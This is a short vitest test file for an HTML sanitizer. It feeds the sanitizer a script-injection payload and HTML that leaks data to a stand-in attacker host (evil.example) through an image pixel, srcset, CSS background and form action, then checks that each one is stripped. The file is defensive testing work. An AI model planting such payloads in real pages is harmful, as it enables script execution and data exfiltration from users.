import { describe, expect, it } from 'vitest';
import { sanitizeDocumentHtml } from './sanitize-html';

describe('sanitizeDocumentHtml', () => {
  it('keeps document structure while removing executable markup', async () => {
    const clean = await sanitizeDocumentHtml(
      '<table><tr><td>Plan</td></tr></table><script>alert(1)</script><img src="data:image/png;base64,AA==" alt="aperçu">',
    );
    expect(clean).toContain('<table>');
    expect(clean).toContain('data:image/png;base64,AA==');
    expect(clean).not.toContain('<script');
  });

  it('blocks passive remote requests and form exfiltration', async () => {
    const clean = await sanitizeDocumentHtml(
      '<img src="https://evil.example/pixel?name=secret.pdf" srcset="https://evil.example/2x 2x"><div style="background:url(https://evil.example/bg)">x</div><form action="https://evil.example"><input name="x"></form>',
    );
    expect(clean).not.toContain('evil.example');
    expect(clean).not.toContain('style=');
    expect(clean).not.toContain('<form');
  });
});
